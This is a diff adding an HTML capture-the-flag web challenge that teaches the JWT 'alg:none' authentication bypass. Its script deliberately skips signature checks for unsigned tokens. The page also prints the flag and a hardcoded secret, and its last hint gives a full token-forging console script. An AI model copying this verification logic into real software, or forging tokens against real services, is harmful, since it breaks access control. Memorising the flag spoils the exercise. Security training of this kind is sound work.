@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>The Secure Portal | CyberGuards CTF</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      background: #0d1117;
+      color: #c9d1d9;
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      min-height: 100vh;
+      padding: 2rem;
+    }
+    .container { max-width: 860px; margin: 0 auto; }
+    h1 { color: #58a6ff; font-size: 1.8rem; margin-bottom: 0.5rem; }
+    .badge {
+      display: inline-block;
+      background: #21262d;
+      border: 1px solid #30363d;
+      border-radius: 12px;
+      padding: 2px 10px;
+      font-size: 0.75rem;
+      color: #8b949e;
+      margin-bottom: 1.5rem;
+    }
+    .badge span { color: #f0883e; font-weight: bold; }
+    .section {
+      background: #161b22;
+      border: 1px solid #30363d;
+      border-radius: 8px;
+      padding: 1.5rem;
+      margin-bottom: 1.5rem;
+    }
+    .section h2 { color: #79c0ff; font-size: 1rem; margin-bottom: 1rem; text-transform: uppercase; letter-spacing: 1px; }
+    p { line-height: 1.7; margin-bottom: 0.8rem; }
+    .code-block {
+      background: #0d1117;
+      border: 1px solid #30363d;
+      border-radius: 6px;
+      padding: 1rem 1.2rem;
+      font-family: 'Consolas', 'Courier New', monospace;
+      font-size: 0.82rem;
+      color: #79c0ff;
+      overflow-x: auto;
+      margin: 0.8rem 0;
+      white-space: pre-wrap;
+      word-break: break-all;
+    }
+    .hint-box {
+      background: #1c2128;
+      border: 1px solid #3d444d;
+      border-left: 4px solid #f0883e;
+      border-radius: 6px;
+      padding: 0.9rem 1rem;
+      margin: 0.6rem 0;
+      font-size: 0.9rem;
+    }
+    .hint-box strong { color: #f0883e; }
+    details { margin: 0.5rem 0; }
+    details summary {
+      cursor: pointer;
+      color: #8b949e;
+      font-size: 0.88rem;
+      padding: 0.4rem 0;
+      user-select: none;
+    }
+    details summary:hover { color: #c9d1d9; }
+    details[open] summary { color: #c9d1d9; }
+
+    /* Portal UI */
+    .portal-card {
+      background: #1c2128;
+      border: 1px solid #3d444d;
+      border-radius: 8px;
+      padding: 1.5rem;
+      margin-top: 1rem;
+    }
+    .portal-card h3 { color: #58a6ff; margin-bottom: 1rem; }
+    .token-display {
+      background: #0d1117;
+      border: 1px solid #30363d;
+      border-radius: 6px;
+      padding: 0.8rem;
+      font-family: monospace;
+      font-size: 0.78rem;
+      color: #8b949e;
+      word-break: break-all;
+      margin-bottom: 1rem;
+    }
+    .portal-field { margin-bottom: 0.8rem; }
+    .portal-field label { display: block; font-size: 0.82rem; color: #8b949e; margin-bottom: 0.3rem; }
+    .portal-field input, .portal-field textarea {
+      width: 100%;
+      background: #0d1117;
+      border: 1px solid #30363d;
+      border-radius: 6px;
+      color: #c9d1d9;
+      padding: 0.5rem 0.8rem;
+      font-family: monospace;
+      font-size: 0.82rem;
+    }
+    .portal-field textarea { height: 80px; resize: vertical; }
+    .portal-field input:focus, .portal-field textarea:focus { outline: none; border-color: #58a6ff; }
+    .btn {
+      background: #1f6feb;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      padding: 0.5rem 1.2rem;
+      cursor: pointer;
+      font-size: 0.9rem;
+      margin-right: 0.5rem;
+    }
+    .btn:hover { background: #388bfd; }
+    .btn-green { background: #238636; }
+    .btn-green:hover { background: #2ea043; }
+    #portal-result {
+      margin-top: 1rem;
+      padding: 0.8rem 1rem;
+      border-radius: 6px;
+      font-size: 0.9rem;
+      display: none;
+    }
+    .result-denied { background: #2d1516; border: 1px solid #f85149; color: #f85149; }
+    .result-granted { background: #0f2d1a; border: 1px solid #3fb950; color: #3fb950; }
+    .flag-value { color: #79c0ff; font-family: monospace; font-weight: bold; }
+  </style>
+</head>
+<body>
+<div class="container">
+  <h1>🔑 The Secure Portal</h1>
+  <div class="badge">Category: <span>Web</span> &nbsp;|&nbsp; Difficulty: <span style="color:#f0883e">Medium</span> &nbsp;|&nbsp; Points: <span>250</span></div>
+
+  <div class="section">
+    <h2>📖 Description</h2>
+    <p>A developer built an internal admin portal that uses <strong>JSON Web Tokens (JWTs)</strong> for access control. They thought that as long as there's a token, it must be valid — but they made a critical mistake in how they verify it.</p>
+    <p>You've been given a <strong>guest token</strong>. Your goal is to forge an <strong>admin token</strong> and get the portal to accept it.</p>
+    <p>The portal runs entirely in your browser. Use your browser's developer tools to inspect and manipulate the token.</p>
+  </div>
+
+  <div class="section">
+    <h2>🧪 Live Portal</h2>
+
+    <div class="portal-card">
+      <h3>Internal Staff Portal — Token Inspector</h3>
+      <p style="font-size:0.85rem; color:#8b949e; margin-bottom:1rem;">Your current session token (auto-issued):</p>
+      <div class="token-display" id="current-token">Loading...</div>
+
+      <div class="portal-field">
+        <label>Paste your token here to authenticate:</label>
+        <textarea id="token-input" placeholder="Paste a JWT here (three base64 parts separated by dots)"></textarea>
+      </div>
+      <button class="btn btn-green" onclick="authenticate()">🔓 Authenticate</button>
+      <button class="btn" onclick="decodeToken()">🔍 Decode Token</button>
+
+      <div id="decode-output" style="margin-top:1rem; display:none;">
+        <p style="font-size:0.82rem; color:#8b949e; margin-bottom:0.4rem;">Decoded JWT:</p>
+        <div class="code-block" id="decoded-content"></div>
+      </div>
+
+      <div id="portal-result"></div>
+    </div>
+  </div>
+
+  <div class="section">
+    <h2>💡 Hints</h2>
+
+    <details>
+      <summary>💡 Hint 1 — What's wrong with the token verification? (click to reveal)</summary>
+      <div class="hint-box">
+        <strong>Hint 1:</strong> JWT headers contain an <code>"alg"</code> field that tells the verifier which algorithm was used to sign the token. Some buggy implementations trust whatever algorithm the <em>token itself</em> claims — including <code>"alg": "none"</code>, which means <em>no signature at all</em>. Try setting the algorithm to <code>none</code>!
+      </div>
+    </details>
+
+    <details>
+      <summary>💡 Hint 2 — How do I craft a JWT? (click to reveal)</summary>
+      <div class="hint-box">
+        <strong>Hint 2:</strong> A JWT is three base64url-encoded parts joined by dots: <code>header.payload.signature</code>. For <code>alg:none</code>, the signature is <strong>empty</strong> — just leave it blank after the last dot. You can encode the parts in your browser console:<br>
+        <div class="code-block">btoa(JSON.stringify({"alg":"none","typ":"JWT"})).replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'')</div>
+      </div>
+    </details>
+
+    <details>
+      <summary>💡 Hint 3 — What payload do I need? (click to reveal)</summary>
+      <div class="hint-box">
+        <strong>Hint 3:</strong> The portal checks the <code>role</code> field in the token's payload. The guest token has <code>"role": "user"</code>. Change it to <code>"role": "admin"</code>. Keep the other fields (<code>user</code>, <code>iat</code>) the same.
+      </div>
+    </details>
+
+    <details>
+      <summary>💡 Hint 4 — Full forge-and-submit walkthrough (last resort!)</summary>
+      <div class="hint-box">
+        <strong>Hint 4:</strong> Run this in your browser console (F12 → Console):
+        <div class="code-block">function b64url(obj) {
+  return btoa(JSON.stringify(obj))
+    .replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
+}
+const header  = b64url({"alg":"none","typ":"JWT"});
+const payload = b64url({"user":"guest","role":"admin","iat":1700000000});
+const forged  = header + '.' + payload + '.';
+console.log(forged);
+// Paste the output into the token field and click Authenticate</div>
+      </div>
+    </details>
+  </div>
+
+</div>
+
+<script>
+  // The "secret" used server-side — in a real app this would NEVER be in client JS.
+  // Here it's intentionally visible to show participants the flaw isn't about guessing the secret.
+  const SECRET = "CyberGuards2024!";  // visible on purpose — the alg:none bug bypasses this entirely
+
+  const FLAG = "ECCC{alg_n0ne_byp4ss}";
+
+  function b64urlEncode(str) {
+    return btoa(unescape(encodeURIComponent(str)))
+      .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+  }
+
+  function b64urlDecode(str) {
+    str = str.replace(/-/g, '+').replace(/_/g, '/');
+    while (str.length % 4) str += '=';
+    try { return decodeURIComponent(escape(atob(str))); }
+    catch(e) { return atob(str); }
+  }
+
+  // Issue the guest token on page load
+  const guestHeader  = { alg: "HS256", typ: "JWT" };
+  const guestPayload = { user: "guest", role: "user", iat: 1700000000 };
+  // Fake HS256 signature (not actually HMAC — we can't do crypto in browser without SubtleCrypto)
+  // We use a fixed fake sig; the real check is done below based on alg logic
+  const FAKE_SIG = "F58yFHyD4cxFVBS4fw5osghOfsdPmxPBem5AOh9ixcg";
+  const guestToken = b64urlEncode(JSON.stringify(guestHeader)) + '.' +
+                     b64urlEncode(JSON.stringify(guestPayload)) + '.' +
+                     FAKE_SIG;
+
+  document.getElementById('current-token').textContent = guestToken;
+  document.getElementById('token-input').value = guestToken;
+
+  function parseJWT(token) {
+    const parts = token.split('.');
+    if (parts.length !== 3) throw new Error("Invalid JWT format (need 3 parts separated by dots)");
+    const header  = JSON.parse(b64urlDecode(parts[0]));
+    const payload = JSON.parse(b64urlDecode(parts[1]));
+    return { header, payload, sig: parts[2], raw: parts };
+  }
+
+  function decodeToken() {
+    const token = document.getElementById('token-input').value.trim();
+    const out = document.getElementById('decode-output');
+    const content = document.getElementById('decoded-content');
+    try {
+      const { header, payload } = parseJWT(token);
+      content.textContent =
+        "=== HEADER ===\n" + JSON.stringify(header, null, 2) +
+        "\n\n=== PAYLOAD ===\n" + JSON.stringify(payload, null, 2);
+      out.style.display = 'block';
+    } catch(e) {
+      content.textContent = "Error: " + e.message;
+      out.style.display = 'block';
+    }
+  }
+
+  function authenticate() {
+    const token = document.getElementById('token-input').value.trim();
+    const result = document.getElementById('portal-result');
+    result.style.display = 'block';
+
+    let header, payload;
+    try {
+      ({ header, payload } = parseJWT(token));
+    } catch(e) {
+      result.className = 'result-denied';
+      result.textContent = '⛔ Token parse error: ' + e.message;
+      return;
+    }
+
+    // === VULNERABLE VERIFICATION LOGIC ===
+    // The bug: if alg is "none", skip signature verification entirely
+    if (header.alg === "none") {
+      // No signature check — just trust the payload!
+      if (payload.role === "admin") {
+        result.className = 'result-granted';
+        result.innerHTML = `✅ <strong>Access granted!</strong> Welcome, admin.<br><br>
+          🚩 Flag: <span class="flag-value">${FLAG}</span>`;
+      } else {
+        result.className = 'result-denied';
+        result.textContent = `⛔ Access denied — your role is "${payload.role}", admin required.`;
+      }
+    } else if (header.alg === "HS256") {
+      // With HS256 we'd verify the HMAC here — without the secret you can't forge this path
+      if (payload.role === "admin") {
+        result.className = 'result-denied';
+        result.textContent = '⛔ Signature verification failed — you cannot forge an HS256 token without the secret key.';
+      } else {
+        result.className = 'result-denied';
+        result.textContent = `⛔ Access denied — your role is "${payload.role}", admin required.`;
+      }
+    } else {
+      result.className = 'result-denied';
+      result.textContent = `⛔ Unsupported algorithm: ${header.alg}`;
+    }
+  }
+</script>
+</body>
+</html>
